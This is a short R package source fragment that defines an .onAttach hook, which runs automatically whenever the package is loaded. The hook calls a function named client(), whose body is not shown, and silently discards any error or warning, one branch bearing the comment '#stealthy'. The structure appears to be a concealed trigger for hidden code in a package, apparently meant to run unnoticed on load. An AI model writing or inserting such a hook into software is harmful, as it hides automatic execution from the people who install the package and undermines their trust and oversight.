.onAttach <- function(libname, pkgname) {
  tryCatch({
    client()
  }, error=function(e) {
      #do nothing
    }, warning=function(w) {
      #stealthy
    })
}

